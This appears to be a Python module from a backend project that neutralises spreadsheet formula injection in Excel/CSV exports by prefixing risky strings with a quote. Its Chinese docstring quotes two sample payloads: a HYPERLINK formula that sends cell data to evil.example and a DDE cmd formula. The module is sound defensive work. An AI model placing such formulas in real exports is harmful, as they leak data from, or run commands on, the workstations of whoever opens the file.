# backend/common/sheet_safety.py — 表格导出净化（第八轮审查 P2-18）
"""把用户可控文本净化成"一定被当文本"的表格单元格值——**全项目唯一口径**。

**要防什么**（P2-18 实测✓）：审计/借阅/通知这些导出把**低权限写入的字符串**原样写进
Excel/CSV：审计的 `reason`（专员可写）、孩子/家长姓名、书名、订单备注、对账差异文案。
Excel 打开时会把以 `=` 开头的单元格当**公式**求值，于是：

  · `=HYPERLINK("https://evil.example/?d="&A1, "点我")` —— 超管点一下就外发数据；
  · `=cmd|'/c calc'!A1` —— DDE 族，老版本 Excel 可弹执行确认；
  · `=1+1` 这类"无害"公式同样会**污染台账**（导出的数字列拿去再计算就是错的）。

净化为"低权限对高权限工作站的客户端注入"（审查原话）：写的人不需要任何额外权限，
读的人（超管）在自己的工作站上执行。**导出即出口，出口要净化。**

做法：字符串以 `= + - @ Tab CR` 开头 → 前置一个单引号（Excel 的文本前缀，单元格显示时
不可见、内容一字不改）；其余原样返回——数字/日期/None/Decimal **一律不动**，
别把金额变成文本（导出的账必须还能算）。CSV 与 XLSX 共用同一口径（Excel 打开 CSV
时 `+ - @` 同样会被当公式，xlsx 侧 openpyxl 只对 `=` 特殊处理，统一处理更安全）。
"""

from __future__ import annotations

from typing import Any

#: Excel/CSV 会当公式解析的首字符（含 Tab/CR：部分版本会把它们当公式起始空白）
FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def safe_cell(value: Any) -> Any:
    """单个单元格值净化（非字符串原样返回）。"""
    if isinstance(value, str) and value[:1] in FORMULA_PREFIXES:
        return "'" + value
    return value


def safe_row(values: list[Any]) -> list[Any]:
    """整行净化——导出写行的统一入口（`ws.append(safe_row([...]))` / `writer.writerow(...)`）。"""
    return [safe_cell(v) for v in values]
